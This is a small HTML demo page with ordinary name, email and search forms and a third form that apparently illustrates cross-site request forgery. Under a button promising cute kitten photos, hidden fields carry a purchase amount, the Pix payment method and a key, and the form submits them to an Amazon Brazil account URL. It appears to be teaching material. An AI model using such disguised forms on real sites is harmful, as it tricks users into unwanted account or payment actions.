<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>

<body>
  <h1>Demo</h1>
  <form method="post" action="welcome.php">
    Name: <input type="text" name="name" />
    Email: <input type="email" name="email" />
    <input type="submit" />
  </form>

  <form action="search.php">
    Search: <input type="text" name="search">
    <input type="submit" />
  </form>

  <form action="https://www.amazon.com.br/gp/your-account/order-history">
    <input hidden type="text" name="search" value="lapiseira" />
    <input hidden type="text" name="amount" value="100,00" />
    <input hidden type="text" name="payment-method" value="pix" />
    <input hidden type="text" name="dict-key" value="e9bca42a-7ee4-4639-9322-dda31f3f08ae" />
    <input hidden type="text" name="additional-info" value="[{}]" />

    <input type="submit" value="Clique para ver fotos de gatinhos lindos!" />
  </form>
</body>

</html>